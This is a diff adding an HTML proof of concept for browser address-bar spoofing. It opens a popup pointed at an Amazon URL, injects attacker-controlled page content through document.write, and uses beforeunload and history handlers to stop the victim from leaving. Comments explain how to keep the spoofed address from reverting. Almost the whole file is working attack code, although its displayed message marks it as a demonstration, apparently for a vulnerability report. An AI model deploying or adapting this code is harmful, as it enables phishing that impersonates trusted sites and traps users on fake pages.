@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Address Bar Spoof Fixed</title>
+</head>
+<body>
+    <h1>Click to Spoof</h1>
+    <a href="javascript:window.open('https://www.amazon.com:8080/','x');" onclick="startSpoof(); return false;">Spoof</a>
+    
+    <script>
+    let windowSpoof;
+    let raceInterval;
+    
+    function race() {
+        try {
+            // Try to access location (will throw if cross-origin)
+            windowSpoof.location.href !== 'about:blank';
+        } catch (e) {
+            // When cross-origin error happens, DON'T navigate
+            // Just keep the race condition going
+            // The key is to NOT change location again
+            console.log('Cross-origin detected, maintaining state');
+        }
+    }
+    
+    function startSpoof() {
+        // Prevent default link behavior
+        event.preventDefault();
+        
+        // Open window to target URL
+        windowSpoof = window.open("https://www.amazon.com:8080", "x");
+        
+        if (!windowSpoof) {
+            alert('Popup blocked! Please allow popups.');
+            return;
+        }
+        
+        // Wait a tiny bit for window to initialize
+        setTimeout(() => {
+            try {
+                // Inject spoofed content
+                windowSpoof.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Amazon.com</title>
+                        <style>
+                            body {
+                                font-family: Arial, sans-serif;
+                                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                                color: white;
+                                padding: 50px;
+                                text-align: center;
+                            }
+                            h1 { font-size: 3em; }
+                            .box {
+                                background: rgba(0,0,0,0.3);
+                                padding: 40px;
+                                border-radius: 20px;
+                                margin: 50px auto;
+                                max-width: 600px;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="box">
+                            <h1>🎭 SPOOFED!</h1>
+                            <h2>Your address bar has been spoofed.</h2>
+                            <p>This is NOT https://www.amazon.com:8080/</p>
+                            <p>Address bar shows Amazon, but content is controlled by attacker!</p>
+                        </div>
+                        
+                        <script>
+                            // Prevent any navigation attempts from inside
+                            window.addEventListener('beforeunload', (e) => {
+                                e.preventDefault();
+                                e.returnValue = '';
+                            });
+                            
+                            // Block history navigation
+                            history.pushState(null, null, location.href);
+                            window.addEventListener('popstate', () => {
+                                history.pushState(null, null, location.href);
+                            });
+                        <\/script>
+                    </body>
+                    </html>
+                `);
+                windowSpoof.document.close();
+                
+                console.log('✅ Content injected');
+                
+            } catch (e) {
+                console.error('❌ Injection failed:', e);
+            }
+        }, 50);
+        
+        // DON'T start race condition if you want address bar to stay
+        // The race condition is what causes it to change back
+        // Comment out this line:
+        // setInterval(race, 0);
+    }
+    </script>
+</body>
+</html>
